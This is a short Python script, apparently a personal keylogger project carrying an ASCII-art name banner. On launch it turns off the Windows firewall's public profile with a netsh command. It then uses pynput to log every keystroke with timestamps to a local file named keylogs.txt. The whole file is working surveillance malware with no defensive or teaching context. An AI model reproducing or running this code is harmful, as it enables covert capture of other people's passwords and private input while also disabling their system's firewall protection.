from pynput.keyboard import Key, Listener
import logging
import subprocess
subprocess.check_call('netsh.exe advfirewall set publicprofile state off')


def print_ahmedabdallah(title=""):
    print("""

░█████╗░██╗░░██╗███╗░░░███╗███████╗██████╗░  ░█████╗░██████╗░██████╗░░█████╗░██╗░░░░░██╗░░░░░░█████╗░██╗░░██╗
██╔══██╗██║░░██║████╗░████║██╔════╝██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░░░░░██║░░░░░██╔══██╗██║░░██║
███████║███████║██╔████╔██║█████╗░░██║░░██║  ███████║██████╦╝██║░░██║███████║██║░░░░░██║░░░░░███████║███████║
██╔══██║██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║  ██╔══██║██╔══██╗██║░░██║██╔══██║██║░░░░░██║░░░░░██╔══██║██╔══██║
██║░░██║██║░░██║██║░╚═╝░██║███████╗██████╔╝  ██║░░██║██████╦╝██████╔╝██║░░██║███████╗███████╗██║░░██║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░  ╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
""")
    total_len = 100
    if title:
        padding = total_len - len(title) - 4 
        print("== {} {}\n".format(title, "=" * padding))
    else:
        print("{}\n".format("=" * total_len)) 
     

print_ahmedabdallah()



log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()


